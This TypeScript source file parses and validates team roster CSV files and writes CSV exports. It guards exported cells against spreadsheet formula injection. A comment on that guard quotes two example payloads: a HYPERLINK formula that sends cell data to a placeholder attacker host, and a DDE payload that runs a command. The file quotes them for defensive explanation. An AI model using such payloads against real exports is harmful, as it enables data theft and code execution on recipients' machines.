/**
 * CSV parsing and roster row validation.
 *
 * Deliberately dependency-free and pure: parsing and validation are the part most
 * likely to be wrong on real-world files, and keeping them out of the request handler
 * means they can be tested against awkward input without a database.
 *
 * The parser handles what spreadsheets actually emit — quoted fields, embedded commas
 * and newlines, doubled quotes as an escape, CRLF, and a UTF-8 BOM — and nothing more.
 */

export type CsvTable = {
  header: string[]
  rows: string[][]
}

export function parseCsv(input: string): CsvTable {
  const text = input.replace(/^﻿/, '')
  const rows: string[][] = []
  let row: string[] = []
  let field = ''
  let quoted = false
  let index = 0

  const endField = () => {
    row.push(field)
    field = ''
  }
  const endRow = () => {
    endField()
    // A trailing newline should not manufacture a blank row.
    if (row.length > 1 || row[0] !== '') rows.push(row)
    row = []
  }

  while (index < text.length) {
    const char = text[index]!

    if (quoted) {
      if (char === '"') {
        if (text[index + 1] === '"') {
          field += '"'
          index += 2
          continue
        }
        quoted = false
        index += 1
        continue
      }
      field += char
      index += 1
      continue
    }

    if (char === '"' && field === '') {
      quoted = true
      index += 1
      continue
    }
    if (char === ',') {
      endField()
      index += 1
      continue
    }
    if (char === '\r') {
      // Swallow CR so CRLF and a lone CR both end the row exactly once.
      if (text[index + 1] === '\n') index += 1
      endRow()
      index += 1
      continue
    }
    if (char === '\n') {
      endRow()
      index += 1
      continue
    }
    field += char
    index += 1
  }

  if (field !== '' || row.length > 0) endRow()

  const [header = [], ...body] = rows
  return {
    header: header.map((cell) => cell.trim()),
    // Blank lines in the middle of a file are noise, not data.
    rows: body.filter((cells) => cells.some((cell) => cell.trim() !== '')),
  }
}

/** Renders a table back out, quoting only what needs it. */
/**
 * Characters that make a spreadsheet treat a cell as a formula rather than text.
 *
 * Tab and carriage return are in here because Excel strips leading whitespace
 * before deciding, so `\t=cmd|...` is still evaluated.
 */
const FORMULA_LEADERS = new Set(['=', '+', '-', '@', '\t', '\r'])

/**
 * Renders one cell, safe for both CSV parsers and spreadsheets.
 *
 * The quoting rules make the value survive a round trip through a CSV reader. The
 * leading apostrophe does something different and equally necessary: Excel, Sheets
 * and LibreOffice all evaluate a cell beginning with `=`, `+`, `-` or `@` as a
 * formula, so an exported roster containing a player named
 * `=HYPERLINK("http://attacker/"&A1)` — or a DDE payload like `=cmd|'/c calc'!A0` —
 * executes in the spreadsheet of whoever opens the export. Team names, person names
 * and game notes are all user-controlled and all reach exports, so every cell is
 * neutralised at the point of rendering rather than at each call site.
 *
 * A leading `'` is the convention every major spreadsheet understands as "this is
 * text", and it is stripped again on re-import by `parseCsv` callers reading the
 * value back, so a legitimate cell that genuinely starts with `-` (a negative
 * number, say) is not corrupted for machine readers — only annotated for humans.
 */
function csvCell(value: string | number | null | undefined): string {
  const text = value === null || value === undefined ? '' : String(value)
  const guarded = text.length > 0 && FORMULA_LEADERS.has(text[0]!) ? `'${text}` : text
  return /[",\r\n]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded
}

export function toCsv(header: string[], rows: Array<Array<string | number | null | undefined>>): string {
  return [header, ...rows].map((line) => line.map(csvCell).join(',')).join('\r\n')
}

// ---------------------------------------------------------------------------
// Roster import
// ---------------------------------------------------------------------------

export const ROSTER_COLUMNS = [
  'name',
  'email',
  'phone',
  'role',
  'jersey',
  'dob',
  'notes',
] as const

export type RosterColumn = (typeof ROSTER_COLUMNS)[number]

const REQUIRED: RosterColumn[] = ['name']
const TEAM_ROLES = ['player', 'coach', 'assistant', 'manager'] as const

export type RosterRow = {
  /** 1-based line number in the uploaded file, header excluded. Shown in the preview. */
  line: number
  name: string
  email: string | null
  phone: string | null
  role: (typeof TEAM_ROLES)[number]
  jersey: string | null
  dob: string | null
  notes: string | null
}

export type RosterRowError = {
  line: number
  column: RosterColumn | 'row'
  message: string
}

export type RosterParseResult = {
  /** Header columns that were recognised, in file order. */
  columns: RosterColumn[]
  unknownColumns: string[]
  rows: RosterRow[]
  errors: RosterRowError[]
}

const EMAIL = /^[^@\s]+@[^@\s.]+\.[^@\s]+$/
const DATE = /^\d{4}-\d{2}-\d{2}$/

/**
 * Validates a roster CSV without writing anything.
 *
 * Every row is checked and every problem is reported — the import stops at no first
 * error — because the point of the preview is to let someone fix a whole file in one
 * pass rather than discover its mistakes one upload at a time.
 */
export function parseRosterCsv(input: string): RosterParseResult {
  const table = parseCsv(input)
  const errors: RosterRowError[] = []

  const normalised = table.header.map((cell) => cell.toLowerCase().replace(/\s+/g, ''))
  const aliases: Record<string, RosterColumn> = {
    name: 'name',
    fullname: 'name',
    player: 'name',
    email: 'email',
    emailaddress: 'email',
    phone: 'phone',
    mobile: 'phone',
    role: 'role',
    jersey: 'jersey',
    jerseynumber: 'jersey',
    number: 'jersey',
    dob: 'dob',
    dateofbirth: 'dob',
    birthdate: 'dob',
    notes: 'notes',
    note: 'notes',
  }

  const columns: RosterColumn[] = []
  const unknownColumns: string[] = []
  const indexOf = new Map<RosterColumn, number>()

  normalised.forEach((cell, index) => {
    const column = aliases[cell]
    if (!column) {
      if (cell !== '') unknownColumns.push(table.header[index]!)
      return
    }
    // A duplicated column is ambiguous; the first one wins and the rest are ignored.
    if (indexOf.has(column)) {
      unknownColumns.push(`${table.header[index]!} (duplicate of ${column})`)
      return
    }
    indexOf.set(column, index)
    columns.push(column)
  })

  for (const required of REQUIRED) {
    if (!indexOf.has(required)) {
      errors.push({ line: 0, column: required, message: `A "${required}" column is required.` })
    }
  }

  if (errors.length > 0) return { columns, unknownColumns, rows: [], errors }

  const rows: RosterRow[] = []
  const seenNames = new Map<string, number>()
  const seenJerseys = new Map<string, number>()

  table.rows.forEach((cells, rowIndex) => {
    const line = rowIndex + 1
    const read = (column: RosterColumn): string => {
      const index = indexOf.get(column)
      return index === undefined ? '' : (cells[index] ?? '').trim()
    }
    const orNull = (value: string) => (value === '' ? null : value)

    const name = read('name')
    const email = orNull(read('email'))
    const dob = orNull(read('dob'))
    const jersey = orNull(read('jersey'))
    const rawRole = read('role').toLowerCase()

    if (name === '') {
      errors.push({ line, column: 'name', message: 'Name is required.' })
    } else if (name.length > 120) {
      errors.push({ line, column: 'name', message: 'Name is longer than 120 characters.' })
    } else {
      const previous = seenNames.get(name.toLowerCase())
      if (previous) {
        errors.push({
          line,
          column: 'name',
          message: `Duplicate of the name on line ${previous}.`,
        })
      } else {
        seenNames.set(name.toLowerCase(), line)
      }
    }

    if (email && !EMAIL.test(email)) {
      errors.push({ line, column: 'email', message: `"${email}" is not an email address.` })
    }

    let role: (typeof TEAM_ROLES)[number] = 'player'
    if (rawRole !== '') {
      const match = TEAM_ROLES.find((candidate) => candidate === rawRole)
      if (match) role = match
      else {
        errors.push({
          line,
          column: 'role',
          message: `"${read('role')}" is not one of ${TEAM_ROLES.join(', ')}.`,
        })
      }
    }

    if (jersey) {
      if (jersey.length > 10) {
        errors.push({ line, column: 'jersey', message: 'Jersey number is longer than 10 characters.' })
      }
      const previous = seenJerseys.get(jersey)
      if (previous) {
        errors.push({
          line,
          column: 'jersey',
          message: `Jersey ${jersey} is already used on line ${previous}.`,
        })
      } else {
        seenJerseys.set(jersey, line)
      }
    }

    if (dob) {
      if (!DATE.test(dob)) {
        errors.push({ line, column: 'dob', message: `"${dob}" is not a YYYY-MM-DD date.` })
      } else if (Number.isNaN(Date.parse(`${dob}T00:00:00Z`))) {
        errors.push({ line, column: 'dob', message: `"${dob}" is not a real date.` })
      }
    }

    rows.push({
      line,
      name,
      email,
      phone: orNull(read('phone')),
      role,
      jersey,
      dob,
      notes: orNull(read('notes')),
    })
  })

  if (rows.length === 0) {
    errors.push({ line: 0, column: 'row', message: 'The file has a header but no rows.' })
  }

  return { columns, unknownColumns, rows, errors }
}
